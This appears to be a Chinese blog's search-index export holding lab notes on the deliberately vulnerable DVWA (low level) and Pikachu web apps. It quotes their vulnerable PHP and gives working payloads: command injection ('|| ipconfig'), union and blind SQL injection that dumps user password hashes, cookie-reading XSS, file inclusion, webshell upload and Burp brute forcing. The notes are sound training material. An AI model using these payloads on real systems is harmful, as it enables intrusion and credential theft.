<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DVWA-low笔记</title>
    <url>/2022/10/01/DVWA-low%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Brute-Force-暴力破解"><a href="#Brute-Force-暴力破解" class="headerlink" title="Brute Force(暴力破解)"></a>Brute Force(暴力破解)</h1><p>简单：参考<a href="https://juejin.cn/post/7119111677383032846">pikachu通关全记录</a> 中的# 0x01 Burt Force(暴力破解漏洞)。</p>
<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>从源代码中，我们可以看出，用户通过输入ping命令，执行系统命令。然后根据服务器是否是Windows NT系统，对目标ip进行不同的ping测试。</p>
<ul>
<li>8.142.189.231 || ipconfig  效果如下：</li>
</ul>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5f3a307943504ed09ea58a0f701609a7~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>观察其url：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=%E6%94%B9%E5%8F%98#</span><br></pre></td></tr></table></figure>
<p>查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>从源代码中，我们看出没有任何防护措施，例如token、验证码这些东西都没有加，安全性能低。只需要将链接发送给用户点击，攻击即可完成！</p>
</blockquote>
<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><a href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=E:/phpstudy/WWW/123.txt">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=E:/phpstudy/WWW/123.txt</a></li>
<li>读取 www下的123.txt文件；</li>
<li>效果如下：</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7493944800b247baa095880e3c35da27~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>从上面图片可以看出通过该漏洞可以进行文件包含漏洞的利用，包括本地文件包含和远程文件包含进行本地信息读取等，远程包含shell等操作。</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/523682ec21dd4b33ace95194087ee2ac~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/070cee4476bd4ed58d8124b1978218e7~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>不知道为什么相对路径不行？试了一下远程文件包含没有成功，如果抛开环境问题，应该是远程文件包含。</p>
</blockquote>
<p>修复方案：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.禁止远程文件包含allow_url_include=off</span><br><span class="line">2.配置open_basedir=指定目录，限制访问区域。</span><br><span class="line">3.过滤../等特殊符号</span><br><span class="line">4.修改Apache日志文件的存放地址</span><br><span class="line">5.开启魔术引号magic_quotes_qpc=on</span><br><span class="line">6.尽量不要使用动态变量调用文件，直接写要包含的文件</span><br></pre></td></tr></table></figure>
<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/768c5062317341b989bfc2b6e5668cdf~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>未对传入的文件做过滤等操作，可直接上传PHP文件，直接包含一句话用菜刀或者蚁剑等工具即可直接连接。或者用metasploit生成PHP文件，去连接!!!</p>
</blockquote>
<h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8a322dc4bd384b878ee915628c057e91~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<ul>
<li>环境没有搭好，以后再弄</li>
</ul>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> input</span><br><span class="line">    $id <span class="operator">=</span> $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Check</span> database</span><br><span class="line">            $query  <span class="operator">=</span> &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            $<span class="keyword">result</span> <span class="operator">=</span> mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) <span class="keyword">or</span> die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res <span class="operator">=</span> mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> results</span><br><span class="line">            while( $<span class="type">row</span> <span class="operator">=</span> mysqli_fetch_assoc( $<span class="keyword">result</span> ) ) &#123;</span><br><span class="line">                <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line">                $<span class="keyword">first</span> <span class="operator">=</span> $<span class="type">row</span>[&quot;first_name&quot;];</span><br><span class="line">                $<span class="keyword">last</span>  <span class="operator">=</span> $<span class="type">row</span>[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                <span class="operator">/</span><span class="operator">/</span> Feedback <span class="keyword">for</span> <span class="keyword">end</span> <span class="keyword">user</span></span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">            break;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            #$sqlite_db_connection <span class="operator">=</span> <span class="keyword">new</span> SQLite3($_DVWA[<span class="string">&#x27;SQLITE_DB&#x27;</span>]);</span><br><span class="line">            #$sqlite_db_connection<span class="operator">-</span><span class="operator">&gt;</span>enableExceptions(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            $query  <span class="operator">=</span> &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results <span class="operator">=</span> $sqlite_db_connection<span class="operator">-</span><span class="operator">&gt;</span>query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo <span class="string">&#x27;Caught exception: &#x27;</span> . $e<span class="operator">-</span><span class="operator">&gt;</span>getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($<span class="type">row</span> <span class="operator">=</span> $results<span class="operator">-</span><span class="operator">&gt;</span>fetchArray()) &#123;</span><br><span class="line">                    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line">                    $<span class="keyword">first</span> <span class="operator">=</span> $<span class="type">row</span>[&quot;first_name&quot;];</span><br><span class="line">                    $<span class="keyword">last</span>  <span class="operator">=</span> $<span class="type">row</span>[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    <span class="operator">/</span><span class="operator">/</span> Feedback <span class="keyword">for</span> <span class="keyword">end</span> <span class="keyword">user</span></span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db<span class="operator">-</span><span class="operator">&gt;</span>lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过代码分析，通过get传参，传入后端拼接到&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;执行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=2&#x27; and &#x27;1&#x27;=&#x27;1&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=2&#x27; and &#x27;1&#x27;=&#x27;2&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&#x27; order by 5--+&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">查询字段数：</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20order%20by%202--+&amp;Submit=Submit#</span><br><span class="line">查询操作系统、版本：</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=0%27%20union%20select%201,2--+&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2%27%20union%20select%20database(),version()%20--+&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2%27%20union%20select%20@@version_compile_os,version()%20--+&amp;Submit=Submit#</span><br><span class="line">- 得出数据库名称： dvwa   版本号：5.5.53   操作系统：Win32</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/09c51a63df3f409c8c1994b5cf8b10fa~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>查询全部数据库名称：</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(schema_name),1  from information_schema.schemata –+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cae954a523b34a11b1c46e1222f5c1cc~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>查询dvwa数据库下的所有表：</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(table_name),1  from information_schema.tables where table_schema&#x3D;database() –+&amp;Submit&#x3D;Submit#</p>
<p>或者：</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(table_name),1  from information_schema.tables where table_schema&#x3D;’dvwa’ –+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/68648b0e8a1d41b288b07897e721dbdc~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>查询所有 users 表的字段名</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(column_name),1  from information_schema.columns where table_name&#x3D;’users’ –+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<blockquote>
<p>查询所有 users 表的字段值<br><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(user_id,0x3a,user,0x2c,password,0x3b),1  from users –+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行’数字型‘和’字符型‘判断：</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1 and 1=3&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20%271%27=%273&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20%271%27=%271&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
<ul>
<li>结论：判断该类型为字符型，且为单引号注入。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20length(database())%3E5%20--+&amp;Submit=Submit#</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c4fc5890ec7499c979c43bc0a66361e~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20length(database())=4%20--+&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>

<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/58f342a8754d473fb105e2ace573f080~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<ul>
<li>说明数据库长度为4</li>
</ul>
<table>
<thead>
<tr>
<th>输入语句</th>
<th>显示结果</th>
</tr>
</thead>
<tbody><tr>
<td>1’ and ascii(substr(database(),1,1))&gt;97#</td>
<td>显示存在，说明第一个字符是一个小写字母且不是a。</td>
</tr>
<tr>
<td>1’ and ascii(substr(database(),1,1))&#x3D;100#</td>
<td>显示存在，说明第一个是d</td>
</tr>
<tr>
<td>1’ and ascii(substr(database(),2,1))&#x3D;118#</td>
<td>显示存在，说明第二个是v</td>
</tr>
<tr>
<td>1’ and ascii(substr(database(),3,1))&#x3D;119#</td>
<td>显示存在，说明第三个是w</td>
</tr>
<tr>
<td>1’ and ascii(substr(database(),4,1))&#x3D;97#</td>
<td>显示存在，说明第四个是a</td>
</tr>
</tbody></table>
<ul>
<li><p>数据库名称为:dvwa</p>
</li>
<li><p>对表的长度进行判断：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>输入语句</th>
<th>显示结果</th>
</tr>
</thead>
<tbody><tr>
<td>1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;10#</td>
<td>不存在</td>
</tr>
<tr>
<td>1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;8#</td>
<td>存在，说明dvwa第一个表长度为9</td>
</tr>
<tr>
<td>1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;9#</td>
<td>存在，验证成功</td>
</tr>
<tr>
<td>同理可以对第二个表的长度进行猜测：</td>
<td></td>
</tr>
<tr>
<td>1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;5#</td>
<td>存在，dvwa第二个表长度为5</td>
</tr>
</tbody></table>
<ul>
<li>哎！反正就是不停的去尝试，方法如上所示。在我的另一篇博客中完整写到过盲注全过程 <a href="https://juejin.cn/post/7089314737309089828#heading-12">点击跳转</a></li>
</ul>
<h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0ad95fc241f04b67be5ba7b6bfe06c73~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/52c120a0576743d4970b7ec6abb65870~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure>
<ul>
<li>懵了啊，啥过滤都没有</li>
</ul>
<h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h1><ul>
<li><p>哎！也是啥过滤都没有<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2fc6777f0a57411ea173b0a9dd69541f~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f7c94119438b46f1842b02b417c2881a~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
</li>
<li><p>那么这个存储型xss，它不会随着页面重新加载js事件而改变，其存储在数据库，下一次刷新页面后依旧会执行该js语句。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Pikachu靶场笔记</title>
    <url>/2022/10/01/Pikachu%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p>
</blockquote>
<h1 id="0x01-Burt-Force-暴力破解漏洞"><a href="#0x01-Burt-Force-暴力破解漏洞" class="headerlink" title="0x01 Burt Force(暴力破解漏洞)"></a>0x01 Burt Force(暴力破解漏洞)</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>一.准备字典</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/59ef53bd85b24b07998313396f440d2c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"><br>二.使用burp suite爆破</p>
<ul>
<li>抓包</li>
</ul>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7da465b82f7d4d41ac4ae81bfbef6375~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<ul>
<li>使用intruder–&gt;cluster bomb模块爆破</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6184264fdb07428facdc3f0e858e8169~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47d9f3b8cb174b15a0434f36f6a734ab~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><ul>
<li>使用 brup suite抓包，并将其发送到 repeater中</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5d9cb50aff9447a9818ff75649717d1e~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9248185d41854b90a3f45dc2fadbea8d~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p>
<blockquote>
<p>观察上面两张抓包图片，我们可以发现，在同一次“未断包”(我自己理解的词)的情况下，改变用户名或密码可以不更改验证码。即验证码未过期。爆破思路同上。</p>
</blockquote>
<h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><ul>
<li>同上，根据 burp抓包，在repeater中重复发送，验证码并没有作用，观察源码，发现其验证码为前端验证，所以验证码根本没有什么作用。</li>
<li>爆破攻击思路同上。</li>
</ul>
<h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><ul>
<li>带有token，一般来说真实网站中带有token，多半就可以放弃了，但是靶场中肯定有解决方法。</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fd98a08a9c684acb8f1237e0b44abd64~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p>
<blockquote>
<p>通过bp中的Grep-Extract 功能截取token，爆破，由于我的burp suite汉化后，没有Grep-Extract功能了。故链接至其他师傅博客。(<a href="https://www.jianshu.com/p/f218735806de">https://www.jianshu.com/p/f218735806de</a>)</p>
</blockquote>
